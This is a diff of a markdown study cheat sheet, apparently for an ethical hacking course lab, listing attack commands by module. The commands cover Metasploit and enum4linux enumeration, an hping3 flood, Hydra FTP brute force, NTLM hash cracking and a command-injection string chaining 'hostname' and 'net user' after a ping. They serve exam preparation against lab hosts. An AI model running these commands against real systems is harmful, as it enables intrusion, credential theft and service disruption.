@@ -1,9 +1,10 @@
+# Sort Note
+
 ### >>> Module 02 : Enumeration 
-------------------------------------------------------
 ping www.moviescope.com –f –l 1500 -> Frame size
 tracert www.moviescope.com -> Determining hop count
 
-------------------------------------------------------
+
 ### >> Enumeration using Metasploit :
 ------------------------------------------------------
 msfdb init
@@ -16,7 +17,6 @@ hosts -> To show all available hosts in the subnet
 db_nmap -sS -A 10.10.10.16 -> To extract services of particular machine
 services -> to get all available services in a subnet
 
-------------------------------------------------------
 ### >> SMB Version Enumeration using MSF
 ------------------------------------------------------
 use scanner/smb/smb_version
@@ -25,7 +25,6 @@ set THREADS 100
 run
 hosts -> now exact os_flavor information has been updated
 
-------------------------------------------------------
 ### >> Module 03 : Scanning Networks
 ------------------------------------------------------
 Port Scanning using Hping3:
@@ -45,7 +44,6 @@ hping3 -S 10.10.10.10 -p 80 -c 5-S will perform TCP SYN request on the target ma
 HPing flood
 hping3 10.10.10.10 --flood
 
-------------------------------------------------------
 ### >>> Module 04 : Enumeration
 ------------------------------------------------------
 
@@ -60,7 +58,7 @@ set RHOSTS and exploit
 
 
 snmp-check <IP address>
-------------------------------------------------------
+
 ### >> NetBIOS Enumeration (139) : 
 ------------------------------------------------------
 nbtstat –A 10.10.10.16
@@ -69,7 +67,6 @@ net use \10.10.10.16\e ““\user:””
 net use \10.10.10.16\e ““/user:””
 NetBIOS Enumerator
 
-------------------------------------------------------
 ### >>Enum4Linux Wins Enumeration :
 ------------------------------------------------------
 
@@ -79,11 +76,9 @@ enum4linux -u martin -p apple -P 10.10.10.12 -> Password Policy Information
 enum4linux -u martin -p apple -G 10.10.10.12 -> Groups Information
 enum4linux -u martin -p apple -S 10.10.10.12 -> Share Policy Information (SMB Shares Enumeration)
 
-------------------------------------------------------
 ### >>Active Directory LDAP Enumeration : ADExplorer
 ------------------------------------------------------
 
-------------------------------------------------------
 ### >>Module 05 : Vulnerability Analysis 
 ------------------------------------------------------
 nikto -h http://www.goodshopping.com -Tuning 1 
@@ -98,7 +93,6 @@ Enter name & Target
 Schedule tab > Turn of Enabled
 Hit launch from drop-down of save.
 
-------------------------------------------------------
 ### >>>>Module 06 : System Hacking
 ------------------------------------------------------
 >>NTLM Hash crack :
@@ -123,7 +117,6 @@ Replace boxes in hashes.txt with relevant usernames from step 1.
 Ophcrack.exe -> load -> PWDUMP File
 Tables -> Vista free -> select the table directory -> crack
 
-------------------------------------------------------
 ### >>Module 08 : Sniffing
 ------------------------------------------------------
 
@@ -133,7 +126,6 @@ Capture > Options > Manage Interfaces
 Remote Interface > Add > Host &  Port (2002)
 Username & password > Start
 
-------------------------------------------------------
 ### >>>Module 13 : Hacking Web Servers
 ------------------------------------------------------
 FTP Bruteforce with Hydra
@@ -152,7 +144,6 @@ msfconsoleuse auxiliary/scanner/http/wordpress_login_enum
 RCE 
 ping 127.0.0.1 | hostname | net user
 
-------------------------------------------------------
 ### >>>>Module 15 : SQL Injection
 ------------------------------------------------------
 SQLMAP Extract DBS
